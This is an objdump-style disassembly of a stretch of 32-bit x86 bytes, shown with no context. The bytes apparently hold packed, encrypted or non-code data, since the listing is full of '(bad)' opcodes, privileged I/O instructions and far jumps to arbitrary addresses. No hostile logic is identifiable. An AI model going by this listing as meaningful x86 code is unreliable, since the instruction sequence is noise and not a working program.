  403025:	sub    dl,dl
  403027:	cmp    dl,bh
  403029:	call   DWORD PTR [ebx+0x7b4a3663]
  40302f:	pop    ebp
  403030:	push   ecx
  403031:	xchg   ebp,eax
  403032:	lock test BYTE PTR [bp+di+0x64a],bl
  403038:	pop    ds
  403039:	scas   al,BYTE PTR es:[edi]
  40303a:	push   edx
  40303b:	sub    al,0x51
  40303d:	outs   dx,DWORD PTR ds:[esi]
  40303e:	push   edi
  40303f:	adc    al,0x52
  403041:	test   dh,bl
  403043:	pop    ecx
  403044:	push   cs
  403045:	arpl   WORD PTR [ebp+0x4f],bp
  403048:	ja     0x4030c8
  40304a:	arpl   WORD PTR [edx],bp
  40304c:	inc    eax
  40304d:	and    BYTE PTR ds:0xd314b3d4,0x82
  403054:	or     DWORD PTR [edx+0x1e],ecx
  403057:	xchg   ebp,eax
  403058:	sbb    al,0xa2
  40305a:	test   ebp,esi
  40305c:	mov    BYTE PTR [ebx+0x41],cl
  40305f:	xchg   edx,eax
  403060:	pop    ebp
  403061:	jo     0x403084
  403063:	mov    esi,0xbb80b86c
  403068:	jmp    0x9e9f8f11
  40306d:	cs jg  0x4030a9
  403070:	test   al,0x31
  403072:	les    edi,FWORD PTR fs:[ebx]
  403075:	xchg   ebp,eax
  403076:	mov    ah,BYTE PTR [edx]
  403078:	(bad)  
  40307a:	retf   0x7330
  40307d:	cwde   
  40307e:	mov    esi,0x4c36c6fd
  403083:	cs retf 0xcc56
  403087:	fadd   QWORD PTR [esi+ebp*2]
  40308a:	pop    es
  40308b:	xchg   edi,eax
  40308c:	dec    esp
  40308d:	mov    al,ds:0x4f481d43
  403092:	mov    ah,0x11
  403094:	add    ecx,DWORD PTR [ebx+0x23]
  403097:	xlat   BYTE PTR ds:[ebx]
  403098:	jbe    0x4030ea
  40309a:	nop
  40309b:	jns    0x403103
  40309d:	mov    DWORD PTR [ebx-0x1e20a424],ebp
  4030a3:	mov    esp,0xfb1a79aa
  4030a8:	pop    esi
  4030a9:	in     al,dx
  4030aa:	mul    dl
  4030ac:	mov    esi,ebp
  4030ae:	out    0x26,al
  4030b0:	test   eax,0x6ac625f4
  4030b5:	scas   al,BYTE PTR es:[edi]
  4030b6:	sbb    al,0xde
  4030b8:	adc    BYTE PTR [esi-0x2a],dh
  4030bb:	enter  0xd14c,0x86
  4030bf:	retf   
  4030c0:	in     eax,dx
  4030c1:	sti    
  4030c2:	cli    
  4030c3:	cmp    al,0xb7
  4030c5:	imul   BYTE PTR [eax-0x1debcbb3]
  4030cb:	push   ebx
  4030cc:	inc    edx
  4030cd:	jne    0x4030f1
  4030cf:	mov    eax,0xa6e22d45
  4030d4:	push   cs
  4030d5:	xchg   ebx,eax
  4030d6:	inc    esi
  4030d7:	dec    ecx
  4030d8:	and    BYTE PTR cs:[ebx-0x1ede5801],ah
  4030df:	iret   
  4030e0:	iret   
  4030e1:	sbb    al,0xf9
  4030e3:	or     al,0xc9
  4030e5:	inc    edx
  4030e6:	imul   edx,DWORD PTR [ebp+0x2c2b5bc2],0xc3e84b44
  4030f0:	int3   
  4030f1:	sbb    ebp,ebp
  4030f3:	and    cl,BYTE PTR [edx]
  4030f5:	mov    ebx,DWORD PTR [ebx+0x3ed0cc7b]
  4030fb:	(bad)  
  4030fc:	fisubr WORD PTR [ebp-0x5f91e59c]
  403102:	inc    esp
  403103:	jecxz  0x4030d8
  403105:	adc    cl,BYTE PTR [esi+ebp*2+0x67]
  403109:	and    DWORD PTR ds:0xca8c449,edx
  40310f:	add    edx,DWORD PTR [edx]
  403111:	stos   DWORD PTR es:[edi],eax
  403112:	adc    BYTE PTR [eax-0x55],ch
  403115:	mov    ebp,DWORD PTR [edx+0x7250e338]
  40311b:	mov    ch,0xb3
  40311d:	jb     0x403164
  40311f:	push   es
  403120:	push   0x38
  403122:	fst    QWORD PTR [ebp-0x7196790b]
  403128:	js     0x403153
  40312a:	push   esp
  40312b:	xchg   ecx,eax
  40312c:	cmp    eax,0xd777bbe9
  403131:	push   ds
  403132:	sub    eax,0x3f9d58fe
  403137:	or     ch,dl
  403139:	mov    esi,0x48a2ecae
  40313e:	(bad)  
  40313f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403140:	pushf  
  403141:	inc    edi
  403142:	jmp    0xadb1:0xb6817495
  403149:	ss jae 0x403151
  40314c:	cmp    al,0x3
  40314e:	ror    eax,0x17
  403151:	outs   dx,BYTE PTR ds:[esi]
  403152:	sub    dh,BYTE PTR [edx-0x365a266a]
  403158:	mov    esp,0x8005c9f7
  40315d:	jecxz  0x40318d
  40315f:	xor    eax,0x80cf1f0f
  403164:	xor    DWORD PTR [edi],esi
  403166:	xchg   edi,eax
  403167:	mov    al,0x4c
  403169:	and    DWORD PTR [edx-0x22],esi
  40316c:	pop    esp
  40316d:	loop   0x403183
  40316f:	mov    esp,0xf39fe76c
  403174:	jno    0x403133
  403176:	ja     0x403162
  403178:	mov    ah,0xf3
  40317a:	out    dx,eax
  40317b:	aam    0x3e
  40317d:	cli    
  40317e:	imul   esp,DWORD PTR [esi],0x9f3d65ae
  403184:	stos   DWORD PTR es:[edi],eax
  403185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403186:	pushf  
  403187:	in     al,dx
  403188:	inc    edi
  403189:	push   eax
  40318a:	push   ecx
  40318b:	jno    0x4031d0
  40318d:	cmp    BYTE PTR [eax-0x1],dh
  403190:	fild   DWORD PTR [eax+esi*2+0x258384a3]
  403197:	hlt    
  403198:	enter  0x7e61,0x11
  40319c:	sbb    al,0x4f
  40319e:	cdq    
  40319f:	sbb    eax,0x9f579193
  4031a4:	outs   dx,DWORD PTR ds:[esi]
  4031a5:	xor    BYTE PTR [ebx-0x1e5310ec],0xf2
  4031ac:	and    BYTE PTR [eax+eiz*1-0xa],0xdb
  4031b1:	push   esi
  4031b2:	scas   al,BYTE PTR es:[edi]
  4031b3:	in     eax,0xc
  4031b5:	dec    esi
  4031b6:	inc    ebx
  4031b7:	xchg   ebx,eax
  4031b8:	inc    edi
  4031b9:	adc    ah,BYTE PTR [esi]
  4031bb:	les    edi,FWORD PTR [ebp-0x3f33bbf6]
  4031c1:	cmp    BYTE PTR [edi-0x16],0x7c
  4031c5:	cmp    esp,DWORD PTR [ebp-0x2f]
  4031c8:	cmp    ah,cl
  4031ca:	call   0xdae33545
  4031cf:	and    BYTE PTR [eax],0xa
  4031d2:	dec    ecx
  4031d3:	and    eax,0x8bd900a5
  4031d8:	ss inc edi
  4031da:	lea    esi,[edx+0x1f]
  4031dd:	push   ebx
  4031de:	cmp    edi,DWORD PTR [ecx+0x19ac40a8]
  4031e4:	sbb    cl,BYTE PTR [ecx]
  4031e6:	xor    edx,ecx
  4031e8:	dec    ebx
  4031e9:	push   eax
  4031ea:	ficom  DWORD PTR [ecx]
  4031ec:	dec    eax
  4031ed:	mov    eax,ds:0x3845a4ef
  4031f2:	pop    es
  4031f3:	dec    edi
  4031f4:	sub    DWORD PTR [esi-0x6fd07ce8],ecx
  4031fa:	fld    QWORD PTR [edx+esi*8]
  4031fd:	jmp    0x128608
  403202:	sets   ah
  403205:	xor    DWORD PTR [ecx-0x7c465525],edi
  40320b:	fidiv  WORD PTR [eax+edi*2]
  40320e:	xchg   ebp,eax
  40320f:	dec    edx
  403210:	stos   BYTE PTR es:[edi],al
  403211:	jnp    0x4031df
  403213:	mov    al,0x39
  403215:	jbe    0x403249
  403217:	dec    ecx
  403218:	bound  edi,QWORD PTR [ebp-0x1c]
  40321b:	mov    bl,cl
  40321d:	and    dh,BYTE PTR [esi+ebx*8-0x5f927e8f]
  403224:	dec    ebp
  403225:	jmp    0x4031fa
  403227:	fnsave [edi+0x2726aaac]
  40322d:	in     al,dx
  40322e:	fstp   TBYTE PTR [ebx+0x5f733747]
  403234:	iret   
  403235:	or     al,0x18
  403237:	jle    0x403249
  403239:	mov    DWORD PTR [ebx+ecx*8-0xe00fb15],edx
  403240:	shl    DWORD PTR [edx+0x5],1
  403243:	sti    
  403244:	jmp    0x703d98e9
  403249:	sub    edx,DWORD PTR ds:0x3812750b
  40324f:	mov    cs,WORD PTR [esp+eax*8]
  403252:	imul   ebx,DWORD PTR [ebp+0x7b689df3],0x4e
  403259:	jne    0x40323c
  40325b:	cmp    bh,BYTE PTR [ebp-0xf]
  40325e:	addr16 pop esi
  403260:	or     ebp,DWORD PTR [edi+0x5bdcf83f]
  403266:	or     bl,dh
  403268:	icebp  
  403269:	add    eax,0x7d81e270
  40326e:	ror    DWORD PTR [ecx+0x69023e47],1
  403274:	adc    eax,0x2a80aeda
  403279:	push   0x2f4cc893
  40327e:	sar    DWORD PTR [ecx-0x65],1
  403281:	fist   WORD PTR [ebx+0x51e4f075]
  403287:	imul   esi,esi,0xad82b793
  40328d:	sbb    edx,ebp
  40328f:	in     al,dx
  403290:	std    
  403291:	xchg   ecx,eax
  403292:	popf   
  403293:	dec    edi
  403294:	int    0xdb
  403296:	cmp    eax,0x3553b6f7
  40329b:	or     DWORD PTR [edi],eax
  40329d:	out    dx,al
  40329e:	pop    edi
  40329f:	adc    al,ch
  4032a1:	hlt    
  4032a2:	pop    es
  4032a3:	(bad)  
  4032a4:	dec    edx
  4032a5:	fld    st(5)
  4032a7:	gs (bad) 
  4032a9:	sbb    sp,di
  4032ac:	pop    edi
  4032ad:	test   DWORD PTR [esi-0x718db7b3],ebp
  4032b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032b4:	xchg   esi,eax
  4032b5:	mov    dh,0xee
  4032b7:	inc    edi
  4032b8:	inc    edi
  4032b9:	pop    ebx
  4032ba:	cmp    ecx,eax
  4032bc:	repz xchg edx,eax
  4032be:	ins    BYTE PTR es:[edi],dx
  4032bf:	mov    ds:0xf3f24326,eax
  4032c4:	jle    0x4032f5
  4032c6:	adc    BYTE PTR [esi],ch
  4032c8:	cmp    BYTE PTR [edx-0x5c84d92e],cl
  4032ce:	inc    edx
  4032cf:	xor    BYTE PTR [ebp+0x16],al
  4032d2:	mov    eax,ds:0x2eac8b0b
  4032d7:	sub    BYTE PTR [ebp+0x67],ah
  4032da:	loopne 0x4032ac
  4032dc:	jl     0x4032f7
  4032de:	sub    BYTE PTR [edi+0x63],0xc3
  4032e2:	int3   
  4032e3:	and    BYTE PTR [ebp+0x3a],0xc7
  4032e7:	inc    esi
  4032e8:	pop    es
  4032e9:	call   0x2cdf:0x320715fe
  4032f0:	adc    bh,ch
  4032f2:	in     eax,0x62
  4032f4:	mov    bh,0x87
  4032f6:	mov    edi,0x88ddbc34
  4032fb:	sbb    al,0x70
  4032fd:	or     eax,0x77d9c435
  403302:	pusha  
  403303:	(bad)
  403308:	call   0xd626:0x18d7dcc9
  40330f:	jle    0x4032cc
  403311:	fmul   QWORD PTR [ebx+0x78354789]
  403317:	in     eax,dx
  403318:	cmp    BYTE PTR [ecx+0x1918a20a],cl
  40331e:	retf   
  40331f:	mov    bl,0x4e
  403321:	xchg   BYTE PTR [ebp+0x4a894fed],dl
  403327:	aam    0xcf
  403329:	push   edx
  40332a:	add    DWORD PTR [eax-0x98c5519],edx
  403330:	cdq    
  403331:	or     al,0xfe
  403333:	cwde   
  403334:	and    DWORD PTR [edx+0x26],ecx
  403337:	mov    al,ds:0xccc9a574
  40333c:	loope  0x403397
  40333e:	mov    ah,0x66
  403340:	into   
  403341:	(bad)  
  403342:	lds    ebx,FWORD PTR [ebp+0x24]
  403345:	xor    edx,DWORD PTR [ecx]
  403347:	sar    ah,1
  403349:	xchg   edx,eax
  40334a:	test   DWORD PTR [edi+0x4daf1f84],ebp
  403350:	mov    dh,0x47
  403352:	and    esp,ebx
  403354:	cmp    BYTE PTR [ecx*2-0x54b5905b],dh
  40335b:	add    ebp,esp
  40335d:	ds (bad) 
  40335f:	jle    0x40330d
  403361:	xor    ebp,esi
  403363:	into   
  403364:	sub    al,0x21
  403366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403367:	pop    ss
  403368:	mov    bl,0x69
  40336a:	imul   DWORD PTR [edi]
  40336c:	call   0x6fea:0xfc7f2486
  403373:	sti    
  403374:	jns    0x40331b
  403376:	dec    ecx
  403377:	mov    DWORD PTR [esi],ecx
  403379:	sbb    al,bl
  40337b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40337c:	or     BYTE PTR [edx],ah
  40337e:	scas   al,BYTE PTR es:[edi]
  40337f:	call   0xc98:0x8bcdb911
  403386:	test   BYTE PTR [edx-0x53101d3a],0xef
  40338d:	and    BYTE PTR [esp+eax*2-0x34ad29d0],cl
  403394:	xchg   edi,eax
  403395:	sbb    DWORD PTR [edx-0x45c73135],esp
  40339b:	sub    al,cl
  40339d:	mov    edx,0x5b77c33b
  4033a2:	mov    ds:0x22abc5d1,eax
  4033a7:	xchg   ebx,eax
  4033a8:	sbb    DWORD PTR [esi-0x658acb5],0xffffffbb
  4033af:	mov    es,WORD PTR [eax+0x586f93d9]
  4033b5:	mov    al,ds:0xdb3f56ab
  4033ba:	aas    
  4033bb:	adc    edi,DWORD PTR [ebp-0x5]
  4033be:	outs   dx,BYTE PTR ds:[esi]
  4033bf:	(bad)  
  4033c1:	pop    esi
  4033c2:	shl    DWORD PTR [ebx],cl
  4033c4:	mul    BYTE PTR [edx-0x3a9036b8]
  4033ca:	cdq    
  4033cb:	jae    0x4033f4
  4033cd:	mov    al,0x33
  4033cf:	call   0x5b54:0x43bf330e
  4033d6:	xchg   esi,eax
  4033d7:	adc    cl,ch
  4033d9:	clc    
  4033da:	add    cl,0x19
  4033dd:	neg    DWORD PTR [ecx-0x21eec75b]
  4033e3:	ins    DWORD PTR es:[edi],dx
  4033e4:	or     eax,0x803d50c0
  4033e9:	shl    DWORD PTR [ebx],1
  4033eb:	mov    dl,0x9f
  4033ed:	adc    BYTE PTR [ecx],al
  4033ef:	leave  
  4033f0:	js     0x40340b
  4033f2:	mov    ah,0x98
  4033f4:	pop    edx
  4033f5:	cmp    al,ah
  4033f7:	aam    0xfc
  4033f9:	mov    esi,DWORD PTR [ecx+0x29be4531]
  4033ff:	dec    ebx
  403400:	ror    DWORD PTR [edx-0x52f14be2],1
  403406:	pop    esi
  403407:	stc    
  403408:	test   BYTE PTR [edx-0xcb6dae9],dh
  40340e:	pop    edi
  40340f:	cwde   
  403410:	fs fwait
  403412:	xlat   BYTE PTR ds:[ebx]
  403413:	xchg   esi,eax
  403414:	in     eax,0x48
  403416:	mov    WORD PTR [ebx+0x2193ff8f],fs
  40341c:	jl     0x4033bd
  40341e:	rcr    DWORD PTR [ecx+0x4af80dcf],cl
  403424:	lahf   
  403425:	mov    al,ds:0x4b7ffa81
  40342a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40342b:	lods   al,BYTE PTR ds:[esi]
  40342c:	outs   dx,BYTE PTR ds:[esi]
  40342d:	dec    eax
  40342e:	retf   0x3575
  403431:	pop    ebp
  403432:	clc    
  403433:	mov    edx,0x3cd5b02b
  403438:	outs   dx,BYTE PTR ds:[esi]
  403439:	(bad)  
  40343a:	pop    ecx
  40343b:	outs   dx,DWORD PTR ds:[esi]
  40343c:	icebp  
  40343d:	jp     0x403479
  40343f:	dec    edx
  403440:	arpl   WORD PTR [ebx+0x2d1f0c01],di
  403446:	ins    DWORD PTR es:[edi],dx
  403447:	aam    0x9c
  403449:	mov    DWORD PTR [ebp-0x54],eax
  40344c:	int    0x53
  40344e:	jecxz  0x4034b1
  403450:	ins    DWORD PTR es:[edi],dx
  403451:	shr    eax,1
  403453:	push   esp
  403454:	dec    edx
  403455:	mov    WORD PTR [ebp+0x30],gs
  403458:	mov    bh,0xac
  40345a:	int3   
  40345b:	add    dl,ah
  40345d:	les    ebx,FWORD PTR [ecx-0x13445d43]
  403463:	push   edx
  403464:	pop    ebp
  403465:	pop    eax
  403466:	outs   dx,DWORD PTR ds:[esi]
  403467:	xchg   esi,eax
  403468:	push   ss
  403469:	pop    edx
  40346a:	imul   edi,DWORD PTR [edi],0xe1872cfc
  403470:	ins    DWORD PTR es:[edi],dx
  403471:	(bad)  
  403472:	jl     0x4034ac
  403474:	mov    eax,0xc9f559b9
  403479:	xchg   DWORD PTR [eax-0x64fa6c3c],esi
  40347f:	aas    
  403480:	push   ecx
  403481:	pop    ebp
  403482:	ds das 
  403484:	daa    
  403485:	jns    0x4034d4
  403487:	add    DWORD PTR [eax-0x1e],0xffffff99
  40348b:	into   
  40348c:	(bad)  
  40348e:	into   
  40348f:	jecxz  0x40341f
  403491:	mov    DWORD PTR [edx+0x2ca23dfe],0x268a112b
  40349b:	loopne 0x403430
  40349d:	repz adc esi,DWORD PTR [edi+0x7c9e6ec7]
  4034a4:	sub    BYTE PTR [edi+0x34],dl
  4034a7:	inc    edi
  4034a8:	call   0xb0b42346
  4034ad:	out    0x7c,al
  4034af:	cmp    eax,DWORD PTR [esi+0x276d377c]
  4034b5:	ret    0xb5a0
  4034b8:	and    dh,BYTE PTR [edx]
  4034ba:	mov    ecx,0xf55c8834
  4034bf:	std    
  4034c0:	stos   BYTE PTR es:[edi],al
  4034c1:	cmp    DWORD PTR [edi],ecx
  4034c3:	dec    ebx
  4034c4:	(bad)  
  4034c6:	add    al,0xfa
  4034c9:	hlt    
  4034ca:	stos   BYTE PTR es:[edi],al
  4034cb:	pop    ss
  4034cc:	or     eax,0xa17eaf21
  4034d1:	lods   al,BYTE PTR ds:[esi]
  4034d2:	imul   esp,DWORD PTR [ebx+ecx*2+0x45],0xf
  4034d7:	adc    al,0x64
  4034d9:	test   ebx,ebp
  4034db:	and    BYTE PTR [ebp+0x75],cl
  4034de:	jbe    0x4034e2
  4034e0:	adc    BYTE PTR [esi+0x429cbf26],0xc1
  4034e7:	loopne 0x403503
  4034e9:	in     al,dx
  4034ea:	push   eax
  4034eb:	push   edx
  4034ec:	add    eax,0x7f5b1efa
  4034f1:	xor    eax,0xb348e4b3
  4034f6:	test   eax,0xffc257e4
  4034fb:	push   cs
  4034fc:	retf   0xa1e4
  4034ff:	fistp  QWORD PTR [eax+0x5b8ac6ce]
  403505:	hlt    
  403506:	mov    dl,0x42
  403508:	popa   
  403509:	cmp    al,0xc9
  40350b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40350c:	(bad)  
  40350d:	aas    
  40350e:	shr    DWORD PTR [edi+edi*1-0x68ffbe83],0xbe
  403516:	jle    0x403536
  403518:	(bad)  
  403519:	not    BYTE PTR ds:0xb4d8cf5f
  40351f:	out    0x86,al
  403521:	cmp    al,0x3f
  403523:	rcr    DWORD PTR [ebx],cl
  403525:	or     DWORD PTR [esi],edx
  403527:	jecxz  0x4034cb
  403529:	stos   DWORD PTR es:[edi],eax
  40352a:	in     eax,0x40
  40352c:	jp     0x403503
  40352e:	cld    
  40352f:	xor    DWORD PTR [esi],0x9c78c4fb
  403535:	enter  0x6311,0x30
  403539:	xor    DWORD PTR [ebx-0x56894f8],edx
  40353f:	dec    ebx
  403540:	outs   dx,BYTE PTR ds:[esi]
  403541:	pop    esi
  403542:	lahf   
  403543:	inc    esp
  403544:	ret    0xd163
  403547:	(bad)  
  403548:	test   BYTE PTR [eax+0x4cda166b],0x1c
  40354f:	pop    esp
  403550:	mov    ebp,edi
  403552:	sahf   
  403553:	das    
  403554:	(bad)  
  403555:	sub    BYTE PTR [eax-0x65700972],bl
  40355b:	mov    ebx,0xafcae29c
  403560:	or     ecx,DWORD PTR [edi+0x58]
  403563:	test   BYTE PTR [edx-0x7f897602],dh
  403569:	xlat   BYTE PTR ds:[ebx]
  40356a:	dec    ebp
  40356b:	pop    es
  40356c:	lods   al,BYTE PTR ds:[esi]
  40356d:	sub    edi,edx
  40356f:	and    eax,0xf1b898a2
  403574:	dec    esp
  403575:	pop    es
  403576:	fadd   QWORD PTR [esi+eax*2]
  403579:	mov    dl,0xa8
  40357b:	sub    dl,ah
  40357d:	mov    eax,ds:0xb5ae7f0f
  403582:	imul   edi,DWORD PTR [ebx+0x21],0x31
  403586:	fxch   st(3)
  403588:	loopne 0x403543
  40358a:	test   al,0xc6
  40358c:	lea    edi,[eax]
  40358e:	mov    ebx,0xdc0bf3ed
  403593:	add    edx,0xffffffdb
  403596:	cmp    al,0xa0
  403598:	inc    ebp
  403599:	and    al,0x9d
  40359b:	sbb    DWORD PTR [edi],edx
  40359d:	dec    ebx
  40359e:	shr    DWORD PTR [eax-0x15943e17],1
  4035a4:	xchg   edi,eax
  4035a5:	repz adc BYTE PTR [esi+0xafdfbe],dh
  4035ac:	xchg   DWORD PTR [eax+0x4c],ebx
  4035af:	push   esp
  4035b0:	adc    BYTE PTR [esi],dl
  4035b2:	into   
  4035b3:	or     esp,DWORD PTR [esi]
  4035b5:	xchg   esi,eax
  4035b6:	xchg   ebx,eax
  4035b7:	sub    bh,BYTE PTR ds:0x2e26a384
  4035bd:	daa    
  4035be:	mov    dl,0x8f
  4035c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035c1:	and    DWORD PTR [esi+ebp*2],0xb1450946
  4035c8:	setb   al
  4035cb:	push   esp
  4035cc:	gs dec esi
  4035ce:	js     0x4035b5
  4035d0:	cmp    eax,0x57851d17
  4035d5:	push   esp
  4035d6:	or     ah,bh
  4035d8:	push   ebx
  4035d9:	dec    eax
  4035da:	es aaa 
  4035dc:	fwait
  4035dd:	xchg   esi,eax
  4035de:	cwde   
  4035df:	stos   DWORD PTR es:[edi],eax
  4035e0:	xlat   BYTE PTR ds:[ebx]
  4035e1:	pusha  
  4035e2:	mov    ch,0x34
  4035e4:	jmp    0x4bae056d
  4035e9:	pop    eax
  4035ea:	call   0xaf32:0x16264511
  4035f1:	xor    cl,cl
  4035f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035f4:	add    ebx,DWORD PTR [edx-0x1c]
  4035f7:	(bad)  
  4035f8:	dec    ecx
  4035f9:	cmp    DWORD PTR [edx+0x35e89656],esi
  4035ff:	inc    ebx
  403600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403601:	rcl    DWORD PTR [esi+0x2c],0x83
  403605:	stc    
  403606:	cmp    ebx,DWORD PTR [eax-0x471c70ad]
  40360c:	or     al,0xc6
  40360e:	add    eax,0x117257b4
  403613:	jl     0x40360d
  403615:	fild   DWORD PTR es:[ebp+0x98514f7]
  40361c:	(bad)  
  40361d:	cmp    ebx,eax
  40361f:	out    0x2d,al
  403621:	mov    al,0xf9
  403623:	mov    dl,0xa5
  403625:	mov    eax,0xc1afa08e
  40362a:	inc    DWORD PTR ds:0x3fc65e87
  403630:	lea    ecx,[ecx-0x38]
  403633:	fiadd  WORD PTR [ecx+0x13c63d09]
  403639:	sub    DWORD PTR [ecx],ecx
  40363b:	out    dx,eax
  40363c:	mov    ebp,?
  40363e:	loopne 0x4035e4
  403640:	call   0xe7269a8d
  403645:	xor    al,0xa
  403647:	fs cs stos BYTE PTR es:[edi],al
  40364a:	fwait
  40364b:	dec    esp
  40364c:	mov    ebp,0xf7a2f7e5
  403651:	sbb    ah,dl
  403653:	mov    eax,ds:0xa00f4040
  403658:	push   esp
  403659:	sbb    esp,0xa16e7dea
  40365f:	sbb    al,0x5e
  403661:	add    bl,BYTE PTR [ebp+eiz*1+0x12]
  403665:	rol    ah,cl
  403667:	js     0x403625
  403669:	sti    
  40366a:	inc    edx
  40366b:	xchg   ebx,eax
  40366c:	bnd call 0xfc4e12af
  403672:	(bad)  
  403673:	dec    ebx
  403674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403675:	sbb    eax,0x93030ffd
  40367a:	addr16 repnz push 0xf0e8dda9
  403681:	repnz into 
  403683:	mov    ah,0x77
  403685:	loop   0x403617
  403687:	lods   eax,DWORD PTR ds:[esi]
  403688:	fcmovb st,st(3)
  40368a:	pop    esp
  40368b:	sub    DWORD PTR [ecx+0x5e3faaac],0x21a209e9
  403695:	sbb    BYTE PTR [esi-0x6f7933a],cl
  40369b:	pop    ss
  40369c:	ja     0x40364a
  40369e:	adc    eax,0x8d6b4e43
  4036a3:	pop    es
  4036a4:	leave  
  4036a5:	cmp    eax,0x74f2fc0f
  4036aa:	mov    DWORD PTR [edi-0x1],edx
  4036ad:	ror    BYTE PTR [eax-0x1e],1
  4036b0:	or     dh,BYTE PTR [ebx-0x6c821cac]
  4036b6:	sub    ebx,eax
  4036b8:	fs ins DWORD PTR es:[edi],dx
  4036ba:	adc    eax,0x4358c7d7
  4036bf:	in     al,dx
  4036c0:	loopne 0x40372e
  4036c2:	addr16 dec esp
  4036c4:	fistp  DWORD PTR [ebx+edx*4-0x7c]
  4036c8:	pop    ebx
  4036c9:	loope  0x403702
  4036cb:	in     al,dx
  4036cc:	xchg   edi,eax
  4036cd:	out    0x84,eax
  4036cf:	sub    al,0x93
  4036d1:	popa   
  4036d2:	(bad)  
  4036d3:	jnp    0x40367b
  4036d5:	scas   eax,DWORD PTR es:[edi]
  4036d6:	pop    esi
  4036d7:	pop    esp
  4036d8:	sar    dh,cl
  4036da:	nop
  4036db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036dc:	dec    esp
  4036dd:	(bad)  
  4036de:	mov    esp,0x8a641dfc
  4036e3:	into   
  4036e4:	and    bl,al
  4036e6:	sbb    ebp,DWORD PTR [ecx]
  4036e8:	cdq    
  4036e9:	push   ss
  4036ea:	mov    ecx,0xebf9f2c0
  4036ef:	cdq    
  4036f0:	jno    0x4036cf
  4036f2:	imul   esi,DWORD PTR ds:0x93838018,0xe276e479
  4036fc:	jmp    DWORD PTR [edx+0x36cb7e3b]
  403702:	out    dx,al
  403703:	sbb    BYTE PTR [esi+0x59],ah
  403706:	xor    bl,bl
  403708:	mov    bh,0x52
  40370a:	pop    ebx
  40370b:	push   0xd81b247f
  403710:	fild   QWORD PTR [edi]
  403712:	cmp    BYTE PTR [ebx-0x58],bl
  403715:	mov    cl,BYTE PTR [edx+0x47af599e]
  40371b:	leave  
  40371c:	lods   eax,DWORD PTR ds:[esi]
  40371d:	pop    ss
  40371e:	fdiv   QWORD PTR [ebx]
  403720:	adc    eax,0xd8ed06f0
  403725:	jns    0x403779
  403727:	std    
  403728:	ds dec edi
  40372a:	mov    al,ds:0xc31c591
  40372f:	lock popf 
  403731:	sub    al,0xec
  403733:	je     0x4037ab
  403735:	ss inc ebx
  403737:	dec    edi
  403738:	mov    ah,0xf9
  40373a:	jns    0x4037b5
  40373c:	cmp    al,0xad
  40373e:	retf   
  40373f:	mov    eax,0x3579619b
  403744:	mov    al,ds:0x2ef526c7
  403749:	mov    edx,0x6fae4c88
  40374e:	popa   
  40374f:	fmul   DWORD PTR [edi]
  403751:	(bad)  
  403752:	sbb    eax,0x12f45616
  403757:	lea    ebp,[esi+edx*2-0x5ccb0fea]
  40375e:	adc    al,0x2b
  403760:	dec    esp
  403761:	bnd jae 0x4037bb
  403764:	mov    dl,dh
  403766:	fcom   st(2)
  403768:	mov    ds:0xe92aabba,eax
  40376d:	jno    0x403705
  40376f:	xor    al,BYTE PTR [ebx]
  403771:	pop    es
  403772:	idiv   BYTE PTR [edx-0x7c]
  403775:	xor    DWORD PTR [eax+0x18156b90],ebp
  40377b:	or     DWORD PTR [eax+0x7c60fb35],ebx
  403781:	jge    0x40377f
  403783:	lahf   
  403784:	or     ebx,DWORD PTR [edx+0x6c9aec0]
  40378a:	fsubr  QWORD PTR [edi-0x68265df2]
  403790:	jno    0x403777
  403792:	and    al,al
  403794:	(bad)  
  403795:	adc    BYTE PTR [edi+0x7dd80344],ah
  40379b:	retf   0xa772
  40379e:	imul   eax,DWORD PTR cs:[ecx],0x2e
  4037a2:	ror    esp,1
  4037a4:	sbb    eax,0xe0111dd
  4037a9:	or     DWORD PTR [ebp+0x40],ebx
  4037ac:	inc    esp
  4037ad:	test   DWORD PTR [esi+0x6e],eax
  4037b0:	dec    ebx
  4037b1:	sbb    DWORD PTR [ebp+edx*8-0x2e5526fe],edx
  4037b8:	push   ss
  4037b9:	shr    BYTE PTR [ecx-0x59b51623],0x67
  4037c0:	js     0x403779
  4037c2:	adc    al,ah
  4037c4:	cmp    eax,0x2b3c96ea
  4037c9:	adc    edx,DWORD PTR [edi-0x6a0853d4]
  4037cf:	inc    ecx
  4037d0:	jns    0x403833
  4037d2:	mov    esi,0xf41949ff
  4037d7:	inc    esp
  4037d8:	xchg   ecx,eax
  4037d9:	mov    dl,BYTE PTR [edi+0x52]
  4037dc:	inc    esi
  4037dd:	mov    cl,0xd8
  4037df:	test   BYTE PTR [ebx+0x36e1d590],ah
  4037e5:	mov    ebx,0xbfe9e06d
  4037ea:	repz jne 0x4037e1
  4037ed:	push   eax
  4037ee:	cmp    edx,eax
  4037f0:	enter  0x77ec,0xb0
  4037f4:	and    DWORD PTR [esi-0xa],ebx
  4037f7:	adc    eax,0xc5c95be6
  4037fc:	in     al,0x31
  4037fe:	and    cl,BYTE PTR [edi-0x2562a245]
  403804:	loopne 0x40378c
  403806:	mov    bh,0x39
  403808:	pop    ecx
  403809:	inc    ebx
  40380a:	push   edi
  40380b:	sti    
  40380c:	sub    bl,dh
  40380e:	jp     0x40380f
  403810:	lock mov edx,0x29cc8713
  403816:	jmp    0xc941:0x51e9dc44
  40381d:	dec    ebp
  40381e:	stos   BYTE PTR es:[edi],al
  40381f:	push   ecx
  403820:	out    dx,al
  403821:	test   eax,0xd5d26b3
  403826:	sti    
  403827:	imul   ecx,DWORD PTR [edi-0x790d9944],0xffffffa9
  40382e:	push   esp
  40382f:	jl     0x4037ef
  403831:	pop    es
  403832:	psubusw mm1,QWORD PTR [edi+0x17]
  403836:	sbb    ebx,DWORD PTR [edx]
  403838:	lods   al,BYTE PTR ds:[esi]
  403839:	push   ebx
  40383a:	xor    al,0x69
